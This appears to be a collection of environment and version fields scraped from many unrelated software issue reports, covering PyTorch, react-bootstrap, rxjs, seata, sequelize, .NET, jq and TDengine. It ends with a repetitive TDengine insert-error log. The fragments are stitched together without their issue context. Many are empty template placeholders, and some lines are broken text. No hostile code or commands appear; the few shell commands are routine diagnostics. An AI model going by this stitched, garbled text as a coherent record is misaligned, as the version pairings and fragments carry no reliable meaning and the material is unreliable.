gpu 2: geforce gtx 1080 ti nvidia driver version: 418.43
cudnn version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.5.0 versions of relevant libraries:
[pip3] numpy==1.15.4
[conda] mkl 2019.3 intel_199 intel
[conda] mkl-include 2019.3 intel_199 intel
this is on master (fbcode).
pytorch version: 1.0.0
is debug build: no
cuda used to build pytorch: 9.0.176 os: ubuntu 16.04.4 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.7
is cuda available: yes
cuda runtime version: 9.2.88
gpu models and configuration:
gpu 0: quadro gp100
gpu 1: quadro gp100 nvidia driver version: 396.51
cudnn version: could not collect versions of relevant libraries:
[pip] could not collect
[conda] blas 1.0 mkl
[conda] cuda92 1.0 0 pytorch
[conda] mkl 2019.1 144
[conda] mkl_fft 1.0.10 py37h14c3975_1 conda-forge
[conda] mkl_random 1.0.2 py37h637b7d7_2 conda-forge
[conda] pytorch 1.0.0 py3.7_cuda9.0.176_cudnn7.4.1_1 pytorch
[conda] torchvision 0.2.1 py_2 pytorch
- pytorch version (e.g., 1.0): **1.0.0** - os (e.g., linux): **linux** - how you installed pytorch (`conda`, `pip`, source): **pip3** - build command you used (if compiling from source): - python version: **3.6** - cuda/cudnn version: **no cuda** - gpu models and configuration: **no gpu** - any other relevant information: **deployed with serverless and aws lambda, 3008 gb memory and 30 second timeout, works with pytorch 0.4.1**
> pytorch version: 1.0.0.dev20181029
> is debug build: no
> cuda used to build pytorch: 8.0.61
> > os: ubuntu 16.04.4 lts
> gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609
> cmake version: version 3.11.0
> > python version: 3.6
> is cuda available: yes
> cuda runtime version: 9.1.85
> gpu models and configuration: > gpu 0: geforce gtx 1080
> gpu 1: geforce gtx 1080
> > nvidia driver version: 387.26
> cudnn version: probably one of the following:
> /usr/local/matlab/r2016b/bin/glnxa64/libcudnn.so.4.0.7
> /usr/local/cuda-9.1/lib64/libcudnn.so
> /usr/local/cuda-9.1/lib64/libcudnn.so.7
> /usr/local/cuda-9.1/lib64/libcudnn.so.7.0.5
> /usr/local/cuda-9.1/lib64/libcudnn.so.7.1.1
> /usr/local/cuda-9.1/lib64/libcudnn_static.a
> > versions of relevant libraries:
> [pip] could not collect
> [conda] cuda80 1.0 0 soumith
> [conda] cuda91 1.0 h4c16780_0 pytorch
> [conda] guided-filter-pytorch 1.1.1 <pip>
> [conda] magma-cuda91 2.3.0 1 pytorch
> [conda] pytorch-nightly 1.0.0.dev20181029 py3.6_cuda8.0.61_cudnn7.1.2_0 [cuda80] pytorch
> [conda] torch 0.4.0 <pip>
> [conda] torch 0.3.1 <pip>
pytorch version: 1.0.0a0+17c6d16 --> was 0.4.1 with the error
is debug build: no
cuda used to build pytorch: 10.0.130 os: ubuntu 18.04.1 lts
gcc version: (ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
cmake version: version 3.11.0 python version: 3.6
is cuda available: yes
cuda runtime version: could not collect
gpu models and configuration: gpu 0: quadro p5000
nvidia driver version: 410.48
cudnn version: probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.3
/usr/lib/x86_64-linux-gnu/libcudnn_static.a
/usr/local/cuda-10.0/targets/x86_64-linux/lib/libcudnn.so.7.3.1 <-- this is the one used /usr/local/cuda-10.0/targets/x86_64-linux/lib/libcudnn_static.a
/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn.so
/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn.so.7
/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn.so.7.2.1
/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn_static.a versions of relevant libraries:
[pip] could not collect -> is 18.1
[conda] magma-cuda90 2.3.0 1 pytorch
[conda] magma-cuda91 2.3.0 1 pytorch
[conda] magma-cuda92 2.3.0 1 pytorch
[conda] torch 1.0.0a0+17c6d16 <pip> --> was 0.4.1 with the error i hope this helps resolving #11326 and pinpointing down its fault
cheers, jendrik
pytorch version: 0.5.0a0+a24163a
is debug build: no
cuda used to build pytorch: 9.1.85 os: ubuntu 16.04.5 lts
gcc version: (ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609
cmake version: version 3.5.1 python version: 3.6
is cuda available: yes
cuda runtime version: 9.1.85
gpu models and configuration: gpu 0: geforce gtx 1080 ti
nvidia driver version: 390.87
cudnn version: probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.2
/usr/lib/x86_64-linux-gnu/libcudnn_static_v7.a
/usr/local/lib/python3.6/site-packages/cupy/_lib/libcudnn.so.7 versions of relevant libraries:
[pip3] msgpack-numpy (0.4.3.1)
[pip3] numpy (1.15.1)
[pip3] torch (0.5.0a0+a24163a)
[pip3] torchtext (0.2.3)
[pip3] torchvision (0.2.1)
[conda] could not collect
- operating system: windows 10
- browser, version: firefox 81 - react-bootstrap version: 1.3.0
- macos 10.15.4
- chrome 80
- react-bootstrap version 1.0.0
- operating system: mac os
- browser, version firefox 74, chrome 80.0.3987.149
- react-bootstrap version 1.0.0
- operating system: windows 10
- browser, version: ie 11
- react-bootstrap version: 1.0.0-beta.11
react-bootstrap 1.0.0-beta.9
- react-bootstrap version 1.0.0-beta.11 and later
- operating system: macos 10.14.4
- react-bootstrap version 1.0.0-beta.8
- typescript version 3.4.5
- operating system: windows 10
- browser, version: chrome 74
- react-bootstrap version: 1.0.0-beta.6
- rxjs version: 7.0.0-beta.7
- runtime: both node / chrome
- rxjs version: 6.5.4
- runtime: all
- rxjs version: 6.5.5
- runtime: [e.g
node v${x}, chrome v${x}]
- rxjs version:
- (if bug is related) loader, build configuration: [e.g webpack, angular-cli version, config]
- runtime: node v13.10.1
- rxjs version: head, 7.0.0-beta.0, 6.5.5
- runtime: all
- rxjs version: 6.5.5
- rxjs version: 6
- rxjs version: 6.5.4
- runtime: node v12.10.0, chrome v80.0.3987.122
- rxjs version: 6.5.4
- runtime: [e.g
node v12.13.1]
- rxjs version: `6.5.4`
- runtime: node v10.14.2
- rxjs version: 6.5.4
- runtime: node 12
- rxjs version: 6.5.4
- runtime: chrome 79.0.3945.117
- rxjs version: 6.5.2
- typescript version: 3.5.2
- rxjs version: 6.5.2
- runtime: node, typescript 3.3.3
- rxjs version: rxjs version: 6.5.2 by the look of the documentation from this looks like a bug because catcherror can be used as a retry.
- runtime: chrome 70
- rxjs version: 6.5.3
- runtime: node v12.7.0, chrome v78
- rxjs version: 6.5.3
- webpack: 4.41.2 **additional context** related issue: #5051
- runtime: node 10.16.3, chrome 77, windows 10
- rxjs version: 6.5.3
- webpack: 4.41.0
- runtime: chrome latest
- rxjs version: 6
- runtime: node 10 / 12, chrome 76
- rxjs version: 6.5.2
- (if bug is related) loader, build configuration: create-react-app
- built in macos high sierra / wsl in windows10
- runtime: chrome v76
- rxjs version: 6.5.2
- runtime: chrome 76.0.3806.1 (official build) dev (64-bit)
- rxjs version: 6.5.2
- runtime: node
- rxjs version: 6.5.2
- runtime: chrome 74, firefox 66
- rxjs version: 6.5.1
- rxjs version: 6.5.1
- rxjs version: 6.4.0
- rxjs version: 6.3.3
- rxjs version: latest (6.3.3)
- runtime: all
- rxjs version: 6.3.3
- runtime: n/a
- rxjs version: 6.3.3
- (if bug is related) loader, build configuration: [e.g webpack, angular-cli version, config]
- runtime: node v11.3.0
- rxjs version: 6.3.3
- xstream version: 11.7.0
- most version: 1.7.3
- runtime: chrome
- rxjs version: 6.3.x
- rxjs version:
- 6.3.3 **additional notes**
it isn't reproducible with **rxjs** version 6.2.2
- rxjs version: 6.3.x
- runtime: all
- rxjs version: 6.3.0
- runtime: [windows7 64bit, ie v11] - rxjs version: all v6 minify version
- runtime: chrome v67.0.3396.99
- rxjs version: 6.2.2
- runtime: [node & browsers]
- rxjs version:
- jdk version :1.8
- others: springcloud e seata 1.2.0( .9.0 )
- jdk version :1.8.0_171
- os :centos os
- others:seata 1.2
- jdk version :1.8
- os :win10
- others: eureka, sharding-transaction-base-seata-at 4.0.0 sharding-jdbc-spring-boot-starter 4.0.0
spring-cloud-starter-alibaba-seata 2.1.0.release io.seata 1.2.0 myql 5.6 mybatis spring boot,openfeigh
- jdk version :
seata .2.0
- jdk version :
- jdk version : 1.8
- os : client-windows server-linux
- jdk version :
- jdk version :
- jdk version : 1.8
- os :windows
- others: spring-seata 2.1
- jdk version : 1.8
- os : - others:
- jdk version : 1.8
- os : centos
- jdk version : 8
- os : windows, linux
- jdk version :
- jdk version :
- jdk version : 1.8
- os : centos 7
- others: seata 1.0.0
- jdk version : 1.8
- os : win10
- jdk version :1.8
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- dubbo : 2.7.4.1 apache
- seata server: 0.9.0
- seata client: 1.0.0-snapshot
- jdk version :1.8
- os :windows 10
- others:idea
- seata-server: 0.9.0
- springboot: 2.1.7.release
- mybatis: 3.5.2
- jdk version : 1.8
- os : centos 7
- others: db: mysql 5.6, mysql-connector-java: 8.0.15
- jdk version :1.8
- os :windows 10
- others:springboot-2.1.7.release
- seata 0.9.0
- jdk version : jdk1.8
- others: springcloud-jpa-seata:0.8.1
- jdk version :
springboot+springcloud+mybatis
- seata version: 0.8.1
- jdk version :1.8
- os : window10
- others: mysql8
- jdk version :
- jdk version :
- jdk version :
- jdk version :1.8
- jdk version :
- jdk version :1.7
- os :windows7.1
- others:hibernate ibatis druid spring seata-0.8.1 .7
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8
- os : centos 7
- seata: 0.8.0
- jdk version :
- jdk version :
- jdk version :
- jdk version : - os :
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8
- os : macos
- jdk version : 1.8
- os : windows 10
- jdk version :
- jdk version :
- jdk version :
- jdk version :1.8
- os :windows 7
- jdk version :openjdk:11-jre
- seata server version :0.8.0
client base on incubator-shardingsphere,custom replace seata-tm version to 0.8.0
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8
- os : windows
- others: seata version 0.8.1-snapshot
- jdk version :
- jdk version :
- jdk version :
- jdk version :1.8.0_60
- os : windows 10
- jdk version :
- jdk version :1.8
- os :macos
- others:seata version 0.7.1
- jdk version :1.8
- os :windows 10
- others: activiti 5.22.0
- jdk version : java version "1.8.0_161"
java(tm) se runtime environment (build 1.8.0_161-b12)
java hotspot(tm) 64-bit server vm (build 25.161-b12, mixed mode)
- os : window
- others: seata-0.7.1
- jdk version :1.8
- os :macos 10.14.5 (18f132)
- jdk version :
- jdk version : 1.8
- os : linux - others: base image openjdk:8
- jdk version : jdk8
- os : mac - others: seata tcc - version: seata 0.7.1
- jdk version : jdk8
- os : docker
- others: ojdbc8-18.3.0.0
- seata-server version: **v0.7.1**
- jdk version : jdk8
- others: vm flags:
-xmx1g -xms1g -xmn256m
-xx:maxmetaspacesize=256m -xx:maxdirectmemorysize=1g -xx:metaspacesize=256m -xx:+useparallelgc -xx:+useadaptivesizepolicy -xx:maxgcpausemillis=100
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8
- os : mac osx
- jdk version :1.8
- os :window
- others: springboot 1.5.17
- jdk version : 1.8
- os : centos7
- jdk version : 1.8
- os : windows 10
- others: no
- jdk version : 1.8
- os : macos
- seata: 0.6.1
- jdk version :
- others: seata 0.6.1
- jdk version :
- jdk version :1.8
- os : mac os
- jdk version :
- jdk version : 1.8
- os : windows 10
- mysql-connector-java: 5.1.31
- org.apache.dubbo: 2.7.1
- jdk version :1.8
- others: seata .6.1
spring-cloud-alibaba-seata .9.1.build-snapshot
- jdk version :
- jdk version :
- jdk version :1.8
- seata version:0.6.1 or latest
- jdk version :1.8
- os : macos
- seata: 0.6.0-0.6.1
- nacos: 1.0.0
- jdk version :
seata version: 0.6.0
- jdk version : 1.8
- os : centos linux release 7.4.1708 (core)
- others: mysql 8.0.11
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8
- os : windows 10
- others: spring-security-oauth2:2.3.4.release
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :8
- os : winodws
- jdk version : 1.8
- os : windows 10
- others: nacos-server:1.0.0 seata-server:0.5.0
- jdk version : 1.8.0_102
- os : linux
- jdk version :
- jdk version :1.8
- fescar :0.4.0
- jdk version :
- jdk version :
- jdk version :v1.8
- os :windows 7
- others: fescar-spring v0.4.2
- jdk version :1.8
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8
- os : windows
- others: spring cloud 1.5.3 + mybatis
- jdk version :
- jdk version :
- jdk version :jdk1.8.0_172
- os : windows 10
- jdk version :
- jdk version : jdk 1.8
- os : linux
- others: fescar version 0.4.0
- jdk version :
- jdk version :
- jdk version :
- jdk version :1.8
- os : centos 7.2
- others: dubbo 2.8.4, fescar 0.2.1
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8.0_151-b12
- os : macos 10.13.4
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version : 1.8.0_201
- os : windows 10
- others: fescar-server-0.1.2
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- jdk version :
- sequelize version: 6.3.1
- node.js version: 12.16.1
- operating system: windows 10 ## issue template checklist
- sequelize version: 5.21.2
- node.js version: 12.11.1
- operating system: windows 10 x64 ## issue template checklist
- sequelize version: 6 - node.js version: 10 - operating system: macos
- if typescript related: typescript version: xxx ## issue template checklist
- sequelize version: 6.3.0 - node.js version: 10.21.0 - operating system: macos ## issue template checklist
- sequelize version: 5.21.1 - node.js version: 12.17.0 - operating system: arch linux x86_64
- if typescript related: typescript version: 3.9.5 ## issue template checklist
- sequelize version: v6.1.0 - node.js version: v12.16.3x - operating system: osx & docker node:12-alpine ## issue template checklist
- sequelize version: 5.21.10
- node.js version: 12.16.3
- operating system: macos catalina, ubuntu 18.04
- if typescript related: typescript version: 4.28.9 ## issue template checklist
- sequelize version: 6.0.0-beta.6
- node.js version: v12.18.0
- operating system: windows 10
- dialect: mariadb
- db: mysql
- sequelize version: 5 and 6
- node.js version: 12 ## issue template checklist
- sequelize version: latest 5 and 6 version
- node.js version: 12 ## issue template checklist
- sequelize version: 5.21.12
- node.js version: v13.12.0 - operating system: windows 10 ## issue template checklist
- sequelize version: 5.16.0 - node.js version: 10.15.0 - operating system: mac os 10.14.6 ## issue template checklist
- sequelize version: 5.21.4
- mysql2 version: 1.7.0 / 2.1.0
- node.js version: v12.16.3
- operating system: linux ## issue template checklist
- sequelize version: 5.21.5
- node.js version: 13.1.0
- operating system: win10 ## issue template checklist
- sequelize version: 5.21.7
- node.js version: 14.1.0
- operating system: linux
- if typescript related: typescript version: xxx ## issue template checklist
- sequelize version: 5.21.6 - node.js version: 11.1 - operating system: windows 10 ## issue template checklist
- sequelize version: 5.21.7
- node.js version: v10.13.0 - operating system: windows, linux ## issue template checklist
- sequelize version: 5.21.6
- node.js version: 12.14.0
- operating system: windows 10 home (1909) ## issue template checklist
- sequelize version: 5.21.5
- node.js version: 10.19.0 ## issue template checklist
- sequelize version: 5.x
- node.js version: 10.x
- operating system: all
- dialect: mssql
- sequelize version: 5.21.4 - postgresql 10.7
- node.js version: v12.12.0
- operating system: macos catalina 10.15.3 ## issue template checklist
- sequelize version: 5.21.5
- node.js version: 10.19.0
- operating system: ubuntu 18.04 ## issue template checklist
- sequelize version: 5.21.5 - node.js version: 12.11.1 - operating system: mac os catalina ## issue template checklist
- sequelize version: v5.21.5
- node.js version: v12.16.1
- operating system: windows 10
- database: mysql v5.7
## issue template checklist
- sequelize version: 5.21.2
- node.js version: v10.13.0
- operating system: macos mojave (10.14.6) ## issue template checklist
- sequelize version: v5, master
- node.js version v12, v13
- operating system: macos
- if typescript related: typescript version: n/a ## issue template checklist
sequelize version: 5.21.5
node.js version: 12.14.0
operating system: mac os x 10.15.3
## issue template checklist
- sequelize version: master (c845f0bc4f2a51fe681a271845f22f5673725b69)
- node.js version: v12.16.1
- operating system: linux ## issue template checklist
- sequelize version: v5 and v6
- node.js version: 12
- operating system: any ## issue template checklist
- sequelize version: 5.21.5
- node.js version: v10.16.0
- operating system: osx 10.14.6 ## issue template checklist
- sequelize version: sequelize@5.21.3 - node.js version: v12.9.0 - operating system: macos
- if typescript related: typescript version: 3.7.5 ## issue template checklist
- sequelize version: sequelize@5.21.3 - node.js version: v12.14.0
- operating system: ubuntu 19.10 ## issue template checklist
- sequelize version: 5.21.3
- node.js version: 12.14.0
- operating system: windows 10 ## issue template checklist
- sequelize version: sequelize@5.21.3
- node.js version: v13.5.0
- operating system: macos catalina 10.15.2 (19c57)
- typescript: not related
## issue template checklist
- sequelize version: sequelize@5.21.3
- node.js version: v10.16.3
- operating system: windows 10
- if typescript related: (not related) ## issue template checklist
- sequelize version: 5.x
- node.js version: 10.x - operating system: windows - if typescript related: typescript version: xxx ## issue template checklist
- sequelize version: 5.21.2
- node.js version: v10.16.0
- operating system: windows 10 version 1909 ## issue template checklist
- sequelize version:5.21.2
- node.js version: 10.15.2
- operating system: ubuntu linux ## issue template checklist
- sequelize version: 5.21.2
- node.js version: 10.16.3
- operating system: macos mojave 10.14.5 ## issue template checklist
- sequelize version: latest - node.js version: 10 - operating system: macos catalina
- if typescript related: typescript version: false ## issue template checklist
- sequelize version: 5.21.2 - node.js version: 12.12.0
- operating system: macos catalina 10.15.1
- db : ver 15.1 distrib 10.4.6-mariadb, for osx10.15
- npm : 6.12.0 ## issue template checklist
- sequelize version: 5.21.2
- node.js version: 12.10.0
- operating system: debian 10
- if typescript related: typescript version: *no* ## issue template checklist
- sequelize version: 5.18.4 and above
- node.js version: v10.14.1
- operating system: macos mojave 10.14.7 ## issue template checklist
- sequelize version: 5.21.2
- node.js version: 13.0.1
- operating system: centos linux 7
- mysql: 8.0.17 ## issue template checklist
- sequelize version: 5.21.2 - node.js version: 10.15.3 - operating system: windows 10 ## issue template checklist
- sequelize version: 5.21.2 - node.js version: 10.17.0 - operating system: linux mint 19.2 (kernel: 4.15.0-66-generic x86_64) ## issue template checklist
- sequelize version: 5.21.2
- node.js version: 10.13.0
- operating system: centos ## issue template checklist
uses the versions and environments provided by the sscce repo
## issue template checklist
- sequelize version: 4.44.3
- node.js version: 12.13.0
- operating system: mac os ## issue template checklist
- sequelize version: 5.21.1
- node.js version: v10.16.3
- operating system: macos/docker
- if typescript related: typescript version: no ## issue template checklist
- sequelize version: sequelize@4.44.3
- node.js version: v10.16.3
- operating system: windows 10 1903 ## issue template checklist
- sequelize version: 5.21.1 (latest at the time of this writing)
- node.js version: v10.16.3 ## issue template checklist
- sequelize version: `sequelize@5.19.8`
- node.js version: `v12.11.1`
- operating system: ubuntu ## issue template checklist
- sequelize version: sequelize@0.0.0-development
- node.js v10.16.3
- operating system: windows 10 ## issue template checklist
- sequelize version: 5.19.0
- node.js version: 12.12.0 - operating system: mac os ## issue template checklist
- sequelize version: 5.19.6 - node.js version: 10.16.3 - operating system: mac
- if typescript related: typescript version: xxx ## issue template checklist
- sequelize version: 5.19.3 - node.js version: v10.16.3 - operating system: windows 10
- if typescript related: typescript version: n/a ## issue template checklist
- sequelize version: 5.16.0
- node.js version: 10.15.0
- operating system: macos x, linux ## issue template checklist
- sequelize version: sequelize@5.19.4
- node.js version: v9.11.1
- operating system: ubuntu 16.04 ## issue template checklist
- sequelize version: 5.19.1
- node.js version: 10.16.0
- operating system: window mysql 5.7 windows
- sequelize version: 5.19.4 and 4.44.3
- node.js version: 10.16.3
- operating system: ubuntu 14.04.5 lts ## issue template checklist
- sequelize version: sequelize@5.19.0
- node.js version: v10.16.3
- operating system: ubuntu 19.04 amd64
- if typescript related: typescript version: _none_ ## issue template checklist
- sequelize version: 5.8.6 - node.js version: 10.12.0 - operating system: windows? linux ## issue template checklist
- sequelize version: 5.15.0
- node.js version: v12.6.0
- operating system: archlinux ## issue template checklist
- sequelize version: 5.18.4 - node.js version: 12.10.0
- operating system: mac
- if typescript related: typescript version: 3.4.1 ## issue template checklist
- sequelize version: sequelize@5.18.4 - node.js version: v8.11.3
- operating system: osx ## issue template checklist
- sequelize version: 5.18.4 - node.js version: v12.0.0 - operating system: osx -> docker node:12.0 container - mysql version: 5.7.23 ## issue template checklist
- sequelize version: 5.18.4 - node.js version: v12.0.0
- operating system: osx -> docker node:12.0 container
- mysql version: 5.7.23 ## issue template checklist
- sequelize version: master
- node.js version: 12.10
- operating system: windows 10 ## issue template checklist
- sequelize version: 5.8.14
- node.js version: 8.15.0
- operating system: macos mojave 10.14.6 ## issue template checklist
- sequelize version: `5.18.0` through `5.18.4` - node.js version: `v8.16.0` - operating system: `macos 10.14.6`
- if typescript related: typescript version: `n/a` ## issue template checklist
- sequelize version: sequelize@5.15.2 -> sequelize-auto@0.4.29 ->sequelize@3.35.1 - node.js version: v10.16.2
- operating system: macos mojave - 10.14.6 (18g95)
- if typescript related: n/a ## issue template checklist
- sequelize version: 5.15.2
- node.js version: 6.13.4
- operating system: xxx
- if typescript related: typescript version: xxx ## issue template checklist
- sequelize version: 5.18.0
- node.js version: 10.15.0
- operating system: win10 ## issue template checklist
- sequelize version: 5.16.0
- node.js version: 10.15.3
- operating system: mac ## issue template checklist
(operating system, .net framework, etc) / .net framework
win10 .net 4.8
(operating system, .net framework, etc) / .net framework
windows10 .net v4.0.30319
(operating system, .net framework, etc) / .net framework
windows 10 1909 18363.592
(operating system, .net framework, etc) / .net framework
(operating system, .net framework, etc) / .net framework
win7 7601 & win10 1809
(operating system, .net framework, etc) / .net framework
(operating system, .net framework, etc) / .net framework
windows 10, latest .net framework
(operating system, .net framework, etc) / .net framework
win10 .net framework 4.7.2
(operating system, .net framework, etc) / .net framework
(operating system, .net framework, etc) / .net framework
win 10 x64 1909, .net framework 1.1, 2.0.50727, 3.0, 3.5, 4.0, 4.8
(operating system, .net framework, etc) / .net framework
windows 10 1909 (18363.535)
net framework v4.0.30319
(operating system, .net framework, etc) / .net framework
windows 10 1903 ( )
(operating system, .net framework, etc) / .net framework
windows 7 / .net framework 4.7.2
(operating system, .net framework, etc) / .net framework windows 10
(operating system, .net framework, etc) / .net framework
windows 7 64 bit
.net framework 4.7.2
(operating system, .net framework, etc) / .net framework
windows 10 build 17741
(operating system, .net framework, etc) / .net framework
win7 64bit .net framework4.72
(operating system, .net framework, etc) / .net framework
(operating system, .net framework, etc)
(operating system, .net framework, etc)
(operating system, .net framework, etc)
windows 10 pro x64 1703
(operating system, .net framework, etc)
windows 10 14393.1168
(operating system, .net framework, etc)
windows 10 .net4.6
(operating system, .net framework, etc)
windows 10 1607.
(operating system, .net framework, etc)
windows 7 ultimate - 64 bit, .net 4.6.2
(operating system, .net framework, etc)
win7 .net framework 4.6.2
(operating system, .net framework, etc)
win10_14955.rs_prerelease.161020-1700
(operating system, .net framework, etc)
windows7sp1 ![as]( ![default]( nternet \\ \\ s ac ![as]( ![123]( s s
(operating system, .net framework, etc) -windows10-14951.1000 64
.net framework 4.6.1
(operating system, .net framework, etc) windows 14936
(operating system, .net framework, etc) windows 10 14936
- macos (from `sysctl kern.version`: `kern.version: darwin kernel version 18.7.0: mon feb 10 21:08:45 pst 2020; root:xnu-4903.278.28~1/release_x86_64`) - jq v1.6
- bug on osx 10.15.1 (homebrew jq 1.6)
- works on alpine-3.11.3, and ubuntu/centos (via downloading the 64bit binary for 1.6)
- jq version 1.6
- os and version: redhat enterprise linux 6 - jq version 1.6
- os and version: linux ubuntu 18.04.3 - jq version: 1.6
- os and version: linux - jq version: jq-1.5-1-a5b5cbe
- custom built linux distro (gcc-4.9.4, uclibc 0.9.33.2) - jq version: master 37b2d2129e5ff5d79c0f4ef08b031fa257b0bf28
- windows subsystem for linux - ubuntu: jq-1.5-1-a5b5cbe - mint linux - jq-1.5-1-a5b5cbe (ubuntu variant)
- oracle solaris 11.3 sparc - jq 1.4
macos 10.12.6
- linux ubuntu 16.04 - jq version 1.6
- windows 10 enterprise x64 - jq-1.6-94-gaaf200f 2019-05-12
- os and version: osx, 10.13.6 - jq version: 1.6
- macos mojave - jq version 1.5.3 and 1.6 (poured from homebrew bottles)
- os and version: gentoo/linux - jq version: jq-1.6 & jq-1.5
- os and version: gentoo/linux - jq version jq 1.6 @ 27ef4be, also in 1.5
- os and version: ubuntu 16.04 - jq version: version 1.5-1-a5b5cbe **additional**
if i change to use "_module" then the result is fine.
$ jq -ncs --arg _module sodimm '{ $_module, }'
$ {"_module":"sodimm"}
pretty_name="centos linux 7 (core)"
- os and version: windows - jq version: jq 1.6-51-g9a0d5be (master branch)
- os and version: macos mojave (10.14.2) - jq version: 1.6
this problem is reproducible with both the `jq-linux64` and `jq-osx-amd64` builds
the linux build even shows a `segmentation fault` error: ```
$ echo \'{"key1":"value1"}\' | ./jq.1-6 -r -a .key1
segmentation fault $ echo \'{"key1":"value1"}\' | ./jq.1-6 -r .key1
- os and version: macos mojave 10.14.2 (18c54) - jq version 1.6
- os : ubuntu 14.04 - jq version 1.3: installed with > apt-get install jq which doesn't give 1.5, as mentioned on the downloadpage!
- os version: linux ubuntu 16.04.4 lts - jq version: jq-1.6-1-g2f2d05b-dirty
- os and version: [root@sowlx212 ~]# lsb_release -d
description: red hat enterprise linux as release 4 (nahant update 7)
[root@sowlx212 ~]# uname -a
linux sowlx212 2.6.9-78.0.8.elsmp #1 smp wed nov 5 07:14:58 est 2008 x86_64 x86_64 x86_64 gnu/linux - jq version 1.5
- macos 10.11 - jq 1.6rc2 - bug not present in jq 1.5
linux kali 5.2.0-kali3-amd64 #1 smp debian 5.2.17-1kali1 (2019-09-27) x86_64 gnu/linux ] - memory, cpu, current disk space - tdengine version [2.0.6.0]
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
# cat /etc/os-release
pretty_name="debian gnu/linux 10 (buster)"
name="debian gnu/linux"
version_id="10"
version="10 (buster)"
version_codename=buster
home_url=" "
support_url=" "
bug_report_url=" "
# uname --m
tdengine-server-2.0.6.0-linux-x64.deb
- os: centos linux release 7.8.2003 - memory, cpu, current disk space - tdengine version 2.0.6.0
ubuntu 14.0 lst]
- driver :2.0.8/2.0.4/2.0.6 - tdengine version 2.0.6
- os: [centos 7.0] - tdengine version [2.0.5.1]
- os: centos 7.0 eokylin linux advanced server v7update4 - tdengine version .0.5.0 **log
10/23 22:17:08.661386 dnd , rpc msg:submit will be processed in vwrite queue
10/23 22:17:08.661410 tdb error vgid:3 failed to get table to insert data, uid 844424946917849 tid 1
10/23 22:17:08.661416 tdb error vgid:3 failed to insert data since invalid table id
10/23 22:17:08.661507 tsc warn it shall renew table meta, code:invalid table id, retry:1
10/23 22:17:08.662024 mnd user:root, auth info is returned
10/23 22:17:08.662070 dnd , msg:table-meta will be processed in mread queue
10/23 22:17:08.662074 mnd app: : , table:0.ksh.table1_object1, table meta msg is received from thandle: , createflag:0
10/23 22:17:08.662100 mnd app: : , table:0.ksh.table1_object1, uid:844424980473126 table meta is retrieved, vgid:3 sid:3
10/23 22:17:08.662327 dnd , rpc msg:submit will be processed in vwrite queue
10/23 22:17:08.662347 tdb error vgid:3 failed to get table to insert data, uid 844424963695171 tid 2
10/23 22:17:08.662352 tdb error vgid:3 failed to insert data since invalid table id
10/23 22:17:08.662382 tsc warn it shall renew table meta, code:invalid table id, retry:2
10/23 22:17:08.662578 dnd , msg:table-meta will be processed in mread queue
10/23 22:17:08.662584 mnd app: : , table:0.ksh.table1_object1, table meta msg is received from thandle: , createflag:0
10/23 22:17:08.662597 mnd app: : , table:0.ksh.table1_object1, uid:844424980473126 table meta is retrieved, vgid:3 sid:3
10/23 22:17:08.662949 dnd , rpc msg:submit will be processed in vwrite queue
10/23 22:17:08.662991 tdb error vgid:3 failed to get table to insert data, uid 844424963695171 tid 2
10/23 22:17:08.662999 tdb error vgid:3 failed to insert data since invalid table id
10/23 22:17:08.663136 tsc warn it shall renew table meta, code:invalid table id, retry:3
10/23 22:17:08.663552 dnd , msg:table-meta will be processed in mread queue
10/23 22:17:08.663578 mnd app: : , table:0.ksh.table1_object1, table meta msg is received from thandle: , createflag:0
10/23 22:17:08.663624 mnd app: : , table:0.ksh.table1_object1, uid:844424980473126 table meta is retrieved, vgid:3 sid:3
10/23 22:17:08.664074 dnd , rpc msg:submit will be processed in vwrite queue
10/23 22:17:08.664106 tdb error vgid:3 failed to get table to insert data, uid 844424963695171 tid 2
10/23 22:17:08.664111 tdb error vgid:3 failed to insert data since invalid table id
10/23 22:17:08.664137 tsc warn it shall renew table meta, code:invalid table id, retry:4
10/23 22:17:08.664203 dnd , msg:table-meta will be processed in mread queue
10/23 22:17:08.664211 mnd app: : , table:0.ksh.table1_object1, table meta msg is received from thandle: , createflag:0
10/23 22:17:08.664234 mnd app: : , table:0.ksh.table1_object1, uid:844424980473126 table meta is retrieved, vgid:3 sid:3
10/23 22:17:08.664474 dnd , rpc msg:submit will be processed in vwrite queue
10/23 22:17:08.664498 tdb error vgid:3 failed to get table to insert data, uid 844424963695171 tid 2
10/23 22:17:08.664502 tdb error vgid:3 failed to insert data since invalid table id
10/23 22:17:08.664525 tsc warn it shall renew table meta, code:invalid table id, retry:5
10/23 22:17:08.664583 dnd , msg:table-meta will be processed in mread queue
10/23 22:17:08.664597 mnd app: : , table:0.ksh.table1_object1, table meta msg is received from thandle: , createflag:0
10/23 22:17:08.664611 mnd app: : , table:0.ksh.table1_object1, uid:844424980473126 table meta is retrieved, vgid:3 sid:3
10/23 22:17:08.664894 dnd , rpc msg:submit will be processed in vwrite queue
10/23 22:17:08.664917 tdb error vgid:3 failed to get table to insert data, uid 844424963695171 tid 2
10/23 22:17:08.664921 tdb error vgid:3 failed to insert data since invalid table id
